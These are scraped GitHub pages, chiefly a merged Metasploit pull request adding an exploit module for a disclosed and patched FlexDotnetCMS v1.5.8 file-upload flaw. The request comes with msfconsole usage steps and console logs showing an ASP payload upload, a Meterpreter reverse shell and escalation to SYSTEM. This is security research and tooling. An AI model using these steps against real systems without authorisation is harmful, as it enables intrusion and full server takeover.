=== Content from github.com_0ff0a581_20250119_131401.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ftodb-r7)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ftodb-r7)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E&source=header)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

![@todb-r7](https://avatars.githubusercontent.com/u/1170909?s=64&v=4)

**todb-r7**
[Follow](/login?return_to=https%3A%2F%2Fgithub.com%2Ftodb-r7)

[Overview](/todb-r7)
[Repositories
82](/todb-r7?tab=repositories)
[Projects
0](/todb-r7?tab=projects)
[Packages
0](/todb-r7?tab=packages)
[Stars
20](/todb-r7?tab=stars)

More

* [Overview](/todb-r7)
* [Repositories](/todb-r7?tab=repositories)
* [Projects](/todb-r7?tab=projects)
* [Packages](/todb-r7?tab=packages)
* [Stars](/todb-r7?tab=stars)

![@todb-r7](https://avatars.githubusercontent.com/u/1170909?s=64&v=4)

**todb-r7**

[Follow](/login?return_to=https%3A%2F%2Fgithub.com%2Ftodb-r7)

[![View todb-r7's full-sized avatar](https://avatars.githubusercontent.com/u/1170909?v=4)](https://avatars.githubusercontent.com/u/1170909?v=4)

# Tod Beardsley todb-r7

[Follow](/login?return_to=https%3A%2F%2Fgithub.com%2Ftodb-r7)

A more real version of my GitHub presence is over at [@todb](https://github.com/todb). This was my Rapid7-specific account.
[256
followers](https://github.com/todb-r7?tab=followers) · [3
following](https://github.com/todb-r7?tab=following)

* [@rapid7](https://github.com/rapid7)
* [https://infosec.exchange/@todb](https://infosec.exchange/%40todb)
* X
  [@todb](https://twitter.com/todb)

## [Achievements](/todb-r7?tab=achievements)

[![Achievement: Quickdraw](https://github.githubassets.com/assets/quickdraw-default-39c6aec8ff89.png)](/todb-r7?achievement=quickdraw&tab=achievements)[![Achievement: YOLO](https://github.githubassets.com/assets/yolo-default-be0bbff04951.png)](/todb-r7?achievement=yolo&tab=achievements)[![Achievement: Arctic Code Vault Contributor](https://github.githubassets.com/assets/arctic-code-vault-contributor-default-df8d74122a06.png)](/todb-r7?achievement=arctic-code-vault-contributor&tab=achievements)[![Achievement: Starstruck](https://github.githubassets.com/assets/starstruck-default-b6610abad518.png)x3](/todb-r7?achievement=starstruck&tab=achievements)[![Achievement: Pull Shark](https://github.githubassets.com/assets/pull-shark-default-498c279a747d.png)x3](/todb-r7?achievement=pull-shark&tab=achievements)
## [Achievements](/todb-r7?tab=achievements)

[![Achievement: Quickdraw](https://github.githubassets.com/assets/quickdraw-default-39c6aec8ff89.png)](/todb-r7?achievement=quickdraw&tab=achievements)[![Achievement: YOLO](https://github.githubassets.com/assets/yolo-default-be0bbff04951.png)](/todb-r7?achievement=yolo&tab=achievements)[![Achievement: Arctic Code Vault Contributor](https://github.githubassets.com/assets/arctic-code-vault-contributor-default-df8d74122a06.png)](/todb-r7?achievement=arctic-code-vault-contributor&tab=achievements)[![Achievement: Starstruck](https://github.githubassets.com/assets/starstruck-default-b6610abad518.png)x3](/todb-r7?achievement=starstruck&tab=achievements)[![Achievement: Pull Shark](https://github.githubassets.com/assets/pull-shark-default-498c279a747d.png)x3](/todb-r7?achievement=pull-shark&tab=achievements)

Block or Report

# Block or report todb-r7

**Block user**

Prevent this user from interacting with your repositories and sending you notifications.
Learn more about [blocking users](https://docs.github.com/articles/blocking-a-user-from-your-personal-account).

You must be logged in to block users.

Add an optional note:

Please don't include any personal information such as legal names or email addresses. Maximum 100 characters, markdown supported. This note will be visible to only you.

Block user

**Report abuse**

Contact GitHub support about this user’s behavior.
Learn more about [reporting abuse](https://docs.github.com/articles/reporting-abuse-or-spam).

[Report abuse](/contact/report-abuse?report=todb-r7+%28user%29)

[Overview](/todb-r7)
[Repositories
82](/todb-r7?tab=repositories)
[Projects
0](/todb-r7?tab=projects)
[Packages
0](/todb-r7?tab=packages)
[Stars
20](/todb-r7?tab=stars)

More

* [Overview](/todb-r7)
* [Repositories](/todb-r7?tab=repositories)
* [Projects](/todb-r7?tab=projects)
* [Packages](/todb-r7?tab=packages)
* [Stars](/todb-r7?tab=stars)

## Popular repositories Loading

1. [git-completion.bash](/todb-r7/git-completion.bash) git-completion.bash
   Public

   git-completion.bash - autocomplete for bash/zsh

   Shell

   [10](/todb-r7/git-completion.bash/stargazers)
   [10](/todb-r7/git-completion.bash/forks)
2. [eicar](/todb-r7/eicar) eicar
   Public

   EICAR test string, to validate anti-virus detection functionality

   Ruby

   [3](/todb-r7/eicar/stargazers)
   [1](/todb-r7/eicar/forks)
3. [msflint](/todb-r7/msflint) msflint
   Public

   Forked from [h0ng10/msflint](/h0ng10/msflint)

   A lint tool for the metasploit framework

   Ruby

   [2](/todb-r7/msflint/stargazers)
4. [junkdrawer](/todb-r7/junkdrawer) junkdrawer
   Public

   Forked from [todb/junkdrawer](/todb/junkdrawer)

   Silly scripts for small tasks.

   Ruby

   [2](/todb-r7/junkdrawer/stargazers)
   [3](/todb-r7/junkdrawer/forks)
5. [sshkey](/todb-r7/sshkey) sshkey
   Public

   Forked from [bensie/sshkey](/bensie/sshkey)

   SSH private and public key generator in pure Ruby (RSA & DSA)

   Ruby

   [1](/todb-r7/sshkey/stargazers)
6. [simple-network-tools](/todb-r7/simple-network-tools) simple-network-tools
   Public

   Forked from [pentestify/simple\_network\_tools](/pentestify/simple_network_tools)

   Ruby

   [1](/todb-r7/simple-network-tools/stargazers)

Something went wrong, please refresh the page to try again.

If the problem persists, check the [GitHub status page](https://www.githubstatus.com/)
or [contact support](/contact).

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_8006c5a4_20250119_112016.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frapid7%2Fmetasploit-framework%2Fpull%2F14339)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frapid7%2Fmetasploit-framework%2Fpull%2F14339)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fpull_requests_fragments%2Fpull_request_layout&source=header-repo&source_repo=rapid7%2Fmetasploit-framework)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[rapid7](/rapid7)
/
**[metasploit-framework](/rapid7/metasploit-framework)**
Public

* [Notifications](/login?return_to=%2Frapid7%2Fmetasploit-framework) You must be signed in to change notification settings
* [Fork
  14.1k](/login?return_to=%2Frapid7%2Fmetasploit-framework)
* [Star
   34.6k](/login?return_to=%2Frapid7%2Fmetasploit-framework)

* [Code](/rapid7/metasploit-framework)
* [Issues
  410](/rapid7/metasploit-framework/issues)
* [Pull requests
  37](/rapid7/metasploit-framework/pulls)
* [Discussions](/rapid7/metasploit-framework/discussions)
* [Actions](/rapid7/metasploit-framework/actions)
* [Projects
  1](/rapid7/metasploit-framework/projects)
* [Wiki](/rapid7/metasploit-framework/wiki)
* [Security](/rapid7/metasploit-framework/security)
* [Insights](/rapid7/metasploit-framework/pulse)

Additional navigation options

* [Code](/rapid7/metasploit-framework)
* [Issues](/rapid7/metasploit-framework/issues)
* [Pull requests](/rapid7/metasploit-framework/pulls)
* [Discussions](/rapid7/metasploit-framework/discussions)
* [Actions](/rapid7/metasploit-framework/actions)
* [Projects](/rapid7/metasploit-framework/projects)
* [Wiki](/rapid7/metasploit-framework/wiki)
* [Security](/rapid7/metasploit-framework/security)
* [Insights](/rapid7/metasploit-framework/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Frapid7%2Fmetasploit-framework%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Frapid7%2Fmetasploit-framework%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# Add flexdotnetcms v1.5.8 exploit module and docs #14339

 Merged

[space-r7](/space-r7)
merged 5 commits into
[rapid7:master](/rapid7/metasploit-framework/tree/master "rapid7/metasploit-framework:master")
from
ErikWynter:flexdotnetcms

Dec 7, 2020

 Merged

# [Add flexdotnetcms v1.5.8 exploit module and docs](#top) #14339

[space-r7](/space-r7)
merged 5 commits into
[rapid7:master](/rapid7/metasploit-framework/tree/master "rapid7/metasploit-framework:master")
from
ErikWynter:flexdotnetcms

Dec 7, 2020

[Conversation
32](/rapid7/metasploit-framework/pull/14339)
[Commits
5](/rapid7/metasploit-framework/pull/14339/commits)
[Checks
0](/rapid7/metasploit-framework/pull/14339/checks)
[Files changed](/rapid7/metasploit-framework/pull/14339/files)

## Conversation

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

[![ErikWynter](https://avatars.githubusercontent.com/u/55885619?s=60&v=4)](/ErikWynter)

Copy link

Contributor

### @ErikWynter **[ErikWynter](/ErikWynter)** commented [Nov 3, 2020](#issue-735393308) • edited Loading

## About

This change adds a new module to /modules/exploits/windows/http/ that exploits an arbitrary file upload vulnerability in FlexDotnetCMS v1.5.8 ([CVE-2020-27386](https://github.com/advisories/GHSA-j66w-g54r-w535 "CVE-2020-27386")) and prior in order to execute arbitrary commands. The change also adds documentation for this module. I discovered and disclosed the vulnerability, which has been fixed in v1.5.9.

## Vulnerable system

FlexDotnetCMS v1.5.8 and prior

## Verification Steps

1. Install the module as usual
2. Start msfconsole
3. Do: `use exploit/multi/http/FlexDotnetCMS_upload_exec`
4. Do: `set RHOSTS [IP]`
5. Do: `set USERNAME [username for the FlexDotnetCMS account]`
6. Do: `set PASSWORD [password for the FlexDotnetCMS account]`
7. Do: `set target [target]`
8. Do: `set payload [payload]`
9. Do: `set LHOST [IP]`
10. Do: `exploit`

## Options

### PASSWORD

The password for the FlexDotnetCMS account to authenticate with.

### TARGETURI

The base path to FlexDotnetCMS. The default value is `/`.

### USERNAME

The username for the FlexDotnetCMS account to authenticate with. The default value is `admin`.

## Targets

```
Id  Name
--  ----
0   Windows (x86)
1   Windows (x64)

```
## Scenarios

### FlexDotnetCMS v1.5.8 running on Windows Server 2012 - Windows x86 target

```
msf6 exploit(windows/http/flexdotnetcms_upload_exec) > show options
Module options (exploit/windows/http/flexdotnetcms_upload_exec):
   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   Password1        yes       Password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     192.168.1.230    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      1113             yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to FlexDotnetCMS
   USERNAME   admin            yes       Username to authenticate with
   VHOST                       no        HTTP server virtual host
Payload options (windows/meterpreter/reverse_tcp):
   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.1.128    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port
Exploit target:
   Id  Name
   --  ----
   0   Windows (x86)
msf6 exploit(windows/http/flexdotnetcms_upload_exec) > run
[*] Started reverse TCP handler on 192.168.1.128:4444
[*] Executing automatic check (disable AutoCheck to override)
[+] Successfully authenticated to FlexDotnetCMS
[*] FlexDotnetCMS is installed on the target at C:/Users/Administrator/Desktop/FlexDotnetCMS-1.5.8/
[*] Uploaded test file wxoI7s6knq.txt. Attempting to rename the file to wxoI7s6knq.asp...
[+] Successfully renamed test file wxoI7s6knq.txt to wxoI7s6knq.asp (this is a copy of wxoI7s6knq.txt, which remains on the server)
[+] The target is vulnerable. Target is FlexDotnetCMS v1.5.8 or lower.
[*] Renaming wxoI7s6knq.txt to wxoI7s6knq.asp again, this time adding the payload
[+] Successfully added the ASP payload to wxoI7s6knq.asp
[*] Executing the payload...
[*] Sending stage (175174 bytes) to 192.168.1.230
[*] Meterpreter session 9 opened (192.168.1.128:4444 -> 192.168.1.230:62058) at 2020-11-02 11:10:41 -0500
[+] Successfully deleted wxoI7s6knq.txt
[+] Successfully deleted wxoI7s6knq.asp
meterpreter > getuid
Server username: WIN-S623VF4MJDR\Administrator
meterpreter > getsystem
ge...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
tmeterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter >

```
### FlexDotnetCMS v1.5.8 running on Windows Server 2012 - Windows x64 target

```
msf6 exploit(windows/http/flexdotnetcms_upload_exec) > run
[*] Started reverse TCP handler on 192.168.1.128:4444
[*] Executing automatic check (disable AutoCheck to override)
[+] Successfully authenticated to FlexDotnetCMS
[*] FlexDotnetCMS is installed on the target at C:/Users/Administrator/Desktop/FlexDotnetCMS-1.5.8/
[*] Uploaded test file XLz3OTusi.txt. Attempting to rename the file to XLz3OTusi.asp...
[+] Successfully renamed test file XLz3OTusi.txt to XLz3OTusi.asp (this is a copy of XLz3OTusi.txt, which remains on the server)
[+] The target is vulnerable. Target is FlexDotnetCMS v1.5.8 or lower.
[*] Renaming XLz3OTusi.txt to XLz3OTusi.asp again, this time adding the payload
[+] Successfully added the ASP payload to XLz3OTusi.asp
[*] Executing the payload...
[*] Sending stage (200262 bytes) to 192.168.1.230
[*] Meterpreter session 10 opened (192.168.1.128:4444 -> 192.168.1.230:62059) at 2020-11-02 11:10:55 -0500
[+] Successfully deleted XLz3OTusi.txt
[+] Successfully deleted XLz3OTusi.asp
meterpreter > getuid
Server username: WIN-S623VF4MJDR\Administrator
meterpreter >

```

Sorry, something went wrong.

 🎉
1
 gwillcox-r7 reacted with hooray emoji

All reactions

* 🎉
  1 reaction

[![@ErikWynter](https://avatars.githubusercontent.com/u/55885619?s=40&v=4)](/ErikWynter)

`[Add flexdotnetcms_upload_exec module and docs](/rapid7/metasploit-framework/pull/14339/commits/8aceea18724d3b5b6b98ee800c02de107e74201c "Add flexdotnetcms_upload_exec module and docs")`

`[8aceea1](/rapid7/metasploit-framework/pull/14339/commits/8aceea18724d3b5b6b98ee800c02de107e74201c)`

[![@ErikWynter](https://avatars.githubusercontent.com/u/55885619?s=80&u=e6852387fd561b7594bfdb869d952906e0c1e472&v=4)](/ErikWynter)

Copy link

Contributor

Author

### **[ErikWynter](/ErikWynter)** commented [Nov 3, 2020](#issuecomment-721186207)

| Notes  * Please check the documentation for instructions on how to install vulnerable software for testing. I'm afraid this is somewhat of a pain in the ass because the dependencies include a bunch of old software, but everything is still available for free. Visual Studio 2015 community is available here: <https://visualstudio.microsoft.com/vs/older-downloads/> , but you'll need to create a (free) account if you don't already have one. * As mentioned, I requested a CVE ID for this issue, but haven't heard anything from MITRE in almost a month. Because it has been patched, I didn't feel like sitting on it anymore. Plus I figured that this way, Tod at Rapid7 might be able to help assign the CVE. |
| --- |

All reactions

Sorry, something went wrong.

[![@ErikWynter](https://avatars.githubusercontent.com/u/55885619?s=40&u=e6852387fd561b7594bfdb869d952906e0c1e472&v=4)](/ErikWynter)
[ErikWynter](/ErikWynter)
mentioned this pull request
[Nov 3, 2020](#ref-pullrequest-735406233)

[Add HorizontCMS 1.0.0-beta exploit module and documentation
#14340](/rapid7/metasploit-framework/pull/14340)
 Merged

[![@space-r7](https://avatars.githubusercontent.com/u/40177151?s=40&u=a478af0f7ed559a0bfc369dfd5ddd7e5aa5c63db&v=4)](/space-r7)
[space-r7](/space-r7)
added
[docs](/rapid7/metasploit-framework/labels/docs)
[module](/rapid7/metasploit-framework/labels/module)
labels
[Nov 3, 2020](#event-3953960545)

[![@gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=80&u=1144db3aa7b18a30fe7e7d91e1161aa11a819bfd&v=4)](/gwillcox-r7)

Copy link

Contributor

### **[gwillcox-r7](/gwillcox-r7)** commented [Nov 3, 2020](#issuecomment-721337422) • edited Loading

| [@todb-r7](https://github.com/todb-r7) Can you take a look into this? Another case of CVE-ID's being delayed. |
| --- |

All reactions

Sorry, something went wrong.

[![space-r7](https://avatars.githubusercontent.com/u/40177151?s=60&v=4)](/space-r7)

**[space-r7](/space-r7)**
reviewed
[Nov 3, 2020](#pullrequestreview-522876347)

 [View reviewed changes](/rapid7/metasploit-framework/pull/14339/files/8aceea18724d3b5b6b98ee800c02de107e74201c)

Copy link

Contributor

### @space-r7 **[space-r7](/space-r7)** left a comment

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

Thanks for the module! I've just a few suggestions.

Sorry, something went wrong.

All reactions

[modules/exploits/windows/http/flexdotnetcms\_upload\_exec.rb](/rapid7/metasploit-framework/pull/14339/files/8aceea18724d3b5b6b98ee800c02de107e74201c#diff-a437e70cce033b379ddff429e4b1d0adb562d9b3869036fcafdb3771437056d4)
Outdated

Show resolved

Hide resolved

[modules/exploits/windows/http/flexdotnetcms\_upload\_exec.rb](/rapid7/metasploit-framework/pull/14339/files/8aceea18724d3b5b6b98ee800c02de107e74201c#diff-a437e70cce033b379ddff429e4b1d0adb562d9b3869036fcafdb3771437056d4)
Outdated

Show resolved

Hide resolved

[modules/exploits/windows/http/flexdotnetcms\_upload\_exec.rb](/rapid7/metasploit-framework/pull/14339/files/8aceea18724d3b5b6b98ee800c02de107e74201c#diff-a437e70cce033b379ddff429e4b1d0adb562d9b3869036fcafdb3771437056d4)
Outdated

Show resolved

Hide resolved

[modules/exploits/windows/http/flexdotnetcms\_upload\_exec.rb](/rapid7/metasploit-framework/pull/14339/files/8aceea18724d3b5b6b98ee800c02de107e74201c#diff-a437e70cce033b379ddff429e4b1d0adb562d9b3869036fcafdb3771437056d4)
Outdated

Show resolved

Hide resolved

[modules/exploits/windows/http/flexdotnetcms\_upload\_exec.rb](/rapid7/metasploit-framework/pull/14339/files/8aceea18724d3b5b6b98ee800c02de107e74201c#diff-a437e70cce033b379ddff429e4b1d0adb562d9b3869036fcafdb3771437056d4)
Outdated

Show resolved

Hide resolved

[![@ErikWynter](https://avatars.githubusercontent.com/u/55885619?s=40&v=4)](/ErikWynter)

`[Implement suggestions from code review](/rapid7/metasploit-framework/pull/14339/commits/ea70c15b56ac19f02eed13e8889d669f25271c49 "Implement suggestions from code review")`

`[ea70c15](/rapid7/metasploit-framework/pull/14339/commits/ea70c15b56ac19f02eed13e8889d669f25271c49)`

[![@ErikWynter](https://avatars.githubusercontent.com/u/55885619?s=80&u=e6852387fd561b7594bfdb869d952906e0c1e472&v=4)](/ErikWynter)

Copy link

Contributor

Author

### **[ErikWynter](/ErikWynter)** commented [Nov 4, 2020](#issuecomment-721783645)

| Thanks for the feedback [@space-r7](https://github.com/space-r7) ! I just implemented the changes. :) |
| --- |

 👍
1
 space-r7 reacted with thumbs up emoji

All reactions

* 👍
  1 reaction

Sorry, something went wrong.

[![@space-r7](https://avatars.githubusercontent.com/u/40177151?s=40&u=a478af0f7ed559a0bfc369dfd5ddd7e5aa5c63db&v=4)](/space-r7)
[space-r7](/space-r7)
self-assigned this
[Nov 4, 2020](#event-3959373064)

[![@ErikWynter](https://avatars.githubusercontent.com/u/55885619?s=40&v=4)](/ErikWynter)

`[Add CVE ID](/rapid7/metasploit-framework/pull/14339/commits/0a9589166fe45d940203c6a1ab851832e6779826 "Add CVE ID")`

`[0a95891](/rapid7/metasploit-framework/pull/14339/commits/0a9589166fe45d940203c6a1ab851832e6779826)`

[![@ErikWynter](https://avatars.githubusercontent.com/u/55885619?s=80&u=e6852387fd561b7594bfdb869d952906e0c1e472&v=4)](/ErikWynter)

Copy link

Contributor

Author

### **[ErikWynter](/ErikWynter)** commented [Nov 5, 2020](#issuecomment-722333777)

| [@todb-r7](https://github.com/todb-r7) Can you take a look into this? Another case of CVE-ID's being delayed.  [@gwillcox-r7](https://github.com/gwillcox-r7) [@todb-r7](https://github.com/todb-r7) I finally received the CVE ID last night: [CVE-2020-27386](https://github.com/advisories/GHSA-j66w-g54r-w535 "CVE-2020-27386"). I've added it to the module and docs now. |
| --- |

 🎉
1
 gwillcox-r7 reacted with hooray emoji

All reactions

* 🎉
  1 reaction

Sorry, something went wrong.

[![@ErikWynter](https://avatars.githubusercontent.com/u/55885619?s=40&v=4)](/ErikWynter)

`[Add Rubocop changes](/rapid7/metasploit-framework/pull/14339/commits/31237258e5d6e6c79b6fc4dc8a1cfadc0f5956d9 "Add Rubocop changes")`

`[3123725](/rapid7/metasploit-framework/pull/14339/commits/31237258e5d6e6c79b6fc4dc8a1cfadc0f5956d9)`

[![@ErikWynter](https://avatars.githubusercontent.com/u/55885619?s=80&u=e6852387fd561b7594bfdb869d952906e0c1e472&v=4)](/ErikWynter)

Copy link

Contributor

Author

### **[ErikWynter](/ErikWynter)** commented [Nov 5, 2020](#issuecomment-722348996)

| I forgot to run Rubocup before, added the changes now. It still complains about the use of `return` in the cleanup module, but I'm not sure what to do about that so I've left it for now. |
| --- |

All reactions

Sorry, something went wrong.

[![space-r7](https://avatars.githubusercontent.com/u/40177151?s=60&v=4)](/space-r7)

**[space-r7](/space-r7)**
reviewed
[Nov 20, 2020](#pullrequestreview-535670104)

 [View reviewed changes](/rapid7/metasploit-framework/pull/14339/files/31237258e5d6e6c79b6fc4dc8a1cfadc0f5956d9)

Copy link

Contributor

### @space-r7 **[space-r7](/space-r7)** left a comment

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

Mostly minor changes to the `check()` method.

Sorry, something went wrong.

All reactions

[modules/exploits/windows/http/flexdotnetcms\_upload\_exec.rb](/rapid7/metasploit-framework/pull/14339/files/31237258e5d6e6c79b6fc4dc8a1cfadc0f5956d9#diff-a437e70cce033b379ddff429e4b1d0adb562d9b3869036fcafdb3771437056d4)
Outdated

Show resolved

Hide resolved

[modules/exploits/windows/http/flexdotnetcms\_upload\_exec.rb](/rapid7/metasploit-framework/pull/14339/files/31237258e5d6e6c79b6fc4dc8a1cfadc0f5956d9#diff-a437e70cce033b379ddff429e4b1d0adb562d9b3869036fcafdb3771437056d4)
Outdated

Show resolved

Hide resolved

[modules/exploits/windows/http/flexdotnetcms\_upload\_exec.rb](/rapid7/metasploit-framework/pull/14339/files/31237258e5d6e6c79b6fc4dc8a1cfadc0f5956d9#diff-a437e70cce033b379ddff429e4b1d0adb562d9b3869036fcafdb3771437056d4)
Outdated

Show resolved

Hide resolved

[modules/exploits/windows/http/flexdotnetcms\_upload\_exec.rb](/rapid7/metasploit-framework/pull/14339/files/31237258e5d6e6c79b6fc4dc8a1cfadc0f5956d9#diff-a437e70cce033b379ddff429e4b1d0adb562d9b3869036fcafdb3771437056d4)
Outdated

Show resolved

Hide resolved

[modules/exploits/windows/http/flexdotnetcms\_upload\_exec.rb](/rapid7/metasploit-framework/pull/14339/files/31237258e5d6e6c79b6fc4dc8a1cfadc0f5956d9#diff-a437e70cce033b379ddff429e4b1d0adb562d9b3869036fcafdb3771437056d4)
Outdated

Show resolved

Hide resolved

2 hidden conversations

Load more…

